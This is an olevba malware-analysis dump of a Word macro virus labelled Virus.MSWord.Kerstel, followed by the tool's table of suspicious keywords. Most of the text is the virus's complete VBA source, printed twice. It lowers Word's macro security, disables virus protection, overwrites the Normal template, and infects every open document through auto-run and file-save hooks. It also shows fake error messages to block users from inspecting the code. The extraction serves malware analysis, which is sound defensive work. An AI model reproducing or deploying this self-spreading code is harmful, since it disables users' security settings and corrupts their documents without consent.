olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kerstel
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kerstel - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Hawk()
    
    ' H@wK 2001 This virus only infects local Word documents - it is not an email worm
    
    On Error Resume Next
    Randomize
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = False
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
        Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
    End If
    ActiveDocument.VBProject.VBComponents("Hawk").Export "c:\shell32x.sys"
    ActiveDocument.VBProject.VBComponents("Shortcuts").Export "c:\shortcuts.sys"
    ActiveDocument.ReadOnlyRecommended = False
    With Dialogs(wdDialogFileSummaryInfo)
        .Comments = "Don't be suprised by the ]-[@wK!"
        .Execute
    End With
    If NormalTemplate.VBProject.VBComponents.Item("Hawk").Name <> "Hawk" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item("Hawk") _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item("Hawk").CodeModule.CountOfLines)
        NormalTemplate.VBProject.VBComponents.Import "c:\shell32x.sys"
        NormalTemplate.VBProject.VBComponents.Import "c:\shortcuts.sys"
        NormalTemplate.Save
    End If
    
    For j = 1 To Application.Documents.Count
        If Application.Documents.Item(j).VBProject.VBComponents.Item("Hawk").Name <> "Hawk" Then
        Application.Documents.Item(j).VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, Application.Documents.Item(j).VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
        Application.Documents.Item(j).VBProject.VBComponents.Import "c:\shell32x.sys"
        Application.Documents.Item(j).VBProject.VBComponents.Import "c:\shortcuts.sys"
        Application.Documents.Item(j).SaveAs FileName:=Application.Documents.Item(j).FullName, FileFormat:=wdFormatDocument
        End If
    Next j
End Sub
Sub FileSave()
    On Error Resume Next
    Call Hawk
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call Hawk
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Hawk
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Hawk
End Sub
Private Sub Document_New()
    On Error Resume Next
    Call Hawk
End Sub
Private Sub Document_Open()
    On Error Resume Next
    Call Hawk
    DoKey
End Sub
Private Sub Document_Close()
    On Error Resume Next
    Call Hawk
End Sub
Sub ToolsMacro()
    On Error Resume Next
    If ActiveDocument.Words(1) = "ShowShortcut" Then
    Shortcuts.Show
    Else
    If ActiveDocument.Words(1) = "ViewVBCode" Then
    Application.ShowVisualBasicEditor = True
    Else
    Call Hawk
    MsgBox "Installation error 0x80000024" & Chr(10) & "Please reinstall Microsoft Word", vbCritical + vbOKOnly, "CMacroTools::InitWindow() error!"
    MsgBox "To prevent viruses the system administrator has disabled Macro editing", vbInformation + vbOKOnly, "MacroProt v2.0 Beta"
    End If
    End If
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Hawk
    MsgBox "Installation error 0x80000023" & Chr(10) & "Please reinstall Microsoft Word", vbCritical + vbOKOnly, "CFileTemplates::InitWindow() error!"
    MsgBox "To prevent viruses the system administrator has disabled File Templates", vbInformation + vbOKOnly, "MacroProt v2.0 Beta"
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call Hawk
    MsgBox "Installation error 0x80000025" & Chr(10) & "Please reinstall Visual Basic for Applications", vbCritical + vbOKOnly, "CVBEditor::ShowWindow() error!"
    MsgBox "To prevent viruses the system administrator has disabled Macro editing", vbInformation + vbOKOnly, "MacroProt v2.0 Beta"
End Sub

-------------------------------------------------------------------------------
VBA MACRO Hawk.bas 
in file: Virus.MSWord.Kerstel - OLE stream: 'Macros/VBA/Hawk'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Hawk()
    
    ' H@wK 2001 This virus only infects local Word documents - it is not an email worm
    
    On Error Resume Next
    Randomize
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = False
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
        Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
    End If
    ActiveDocument.VBProject.VBComponents("Hawk").Export "c:\shell32x.sys"
    ActiveDocument.VBProject.VBComponents("Shortcuts").Export "c:\shortcuts.sys"
    ActiveDocument.ReadOnlyRecommended = False
    With Dialogs(wdDialogFileSummaryInfo)
        .Comments = "Don't be suprised by the ]-[@wK!"
        .Execute
    End With
    If NormalTemplate.VBProject.VBComponents.Item("Hawk").Name <> "Hawk" Then
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
        NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item("Hawk") _
        .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
        .Item("Hawk").CodeModule.CountOfLines)
        NormalTemplate.VBProject.VBComponents.Import "c:\shell32x.sys"
        NormalTemplate.VBProject.VBComponents.Import "c:\shortcuts.sys"
        NormalTemplate.Save
    End If
    
    For j = 1 To Application.Documents.Count
        If Application.Documents.Item(j).VBProject.VBComponents.Item("Hawk").Name <> "Hawk" Then
        Application.Documents.Item(j).VBProject.VBComponents.Item(1).CodeModule _
        .DeleteLines 1, Application.Documents.Item(j).VBProject.VBComponents.Item(1) _
        .CodeModule.CountOfLines
        Application.Documents.Item(j).VBProject.VBComponents.Import "c:\shell32x.sys"
        Application.Documents.Item(j).VBProject.VBComponents.Import "c:\shortcuts.sys"
        Application.Documents.Item(j).SaveAs FileName:=Application.Documents.Item(j).FullName, FileFormat:=wdFormatDocument
        End If
    Next j
End Sub
Sub FileSave()
    On Error Resume Next
    Call Hawk
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Dialogs(wdDialogFileSaveAs).Show
    Call Hawk
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Hawk
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Hawk
End Sub
Private Sub Document_New()
    On Error Resume Next
    Call Hawk
End Sub
Private Sub Document_Open()
    On Error Resume Next
    Call Hawk
    DoKey
End Sub
Private Sub Document_Close()
    On Error Resume Next
    Call Hawk
End Sub
Sub ToolsMacro()
    On Error Resume Next
    If ActiveDocument.Words(1) = "ShowShortcut" Then
    Shortcuts.Show
    Else
    If ActiveDocument.Words(1) = "ViewVBCode" Then
    Application.ShowVisualBasicEditor = True
    Else
    Call Hawk
    MsgBox "Installation error 0x80000024" & Chr(10) & "Please reinstall Microsoft Word", vbCritical + vbOKOnly, "CMacroTools::InitWindow() error!"
    MsgBox "To prevent viruses the system administrator has disabled Macro editing", vbInformation + vbOKOnly, "MacroProt v2.0 Beta"
    End If
    End If
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call Hawk
    MsgBox "Installation error 0x80000023" & Chr(10) & "Please reinstall Microsoft Word", vbCritical + vbOKOnly, "CFileTemplates::InitWindow() error!"
    MsgBox "To prevent viruses the system administrator has disabled File Templates", vbInformation + vbOKOnly, "MacroProt v2.0 Beta"
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call Hawk
    MsgBox "Installation error 0x80000025" & Chr(10) & "Please reinstall Visual Basic for Applications", vbCritical + vbOKOnly, "CVBEditor::ShowWindow() error!"
    MsgBox "To prevent viruses the system administrator has disabled Macro editing", vbInformation + vbOKOnly, "MacroProt v2.0 Beta"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Shortcuts.frm 
in file: Virus.MSWord.Kerstel - OLE stream: 'Macros/VBA/Shortcuts'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



































































































Private Sub AddPrinter_Click()
Shell "rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL AddPrinter"
End Sub

Private Sub Explorer_Click()
Shell "explorer"
End Sub

Private Sub MSDOS_Click()
Shell "c:\command.com"
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Kerstel' - OLE stream: 'Macros/Shortcuts/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Start ExplorerE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Kerstel' - OLE stream: 'Macros/Shortcuts/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Kerstel' - OLE stream: 'Macros/Shortcuts/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Start MSDOSr�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Kerstel' - OLE stream: 'Macros/Shortcuts/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Kerstel' - OLE stream: 'Macros/Shortcuts/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Add Printerr�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Kerstel' - OLE stream: 'Macros/Shortcuts/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Explorer'" IN 'Virus.MSWord.Kerstel' - OLE stream: 'Macros/Shortcuts'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'MSDOS'" IN 'Virus.MSWord.Kerstel' - OLE stream: 'Macros/Shortcuts'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'AddPrinter'" IN 'Virus.MSWord.Kerstel' - OLE stream: 'Macros/Shortcuts'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |AddPrinter_Click    |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |rundll32.exe        |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

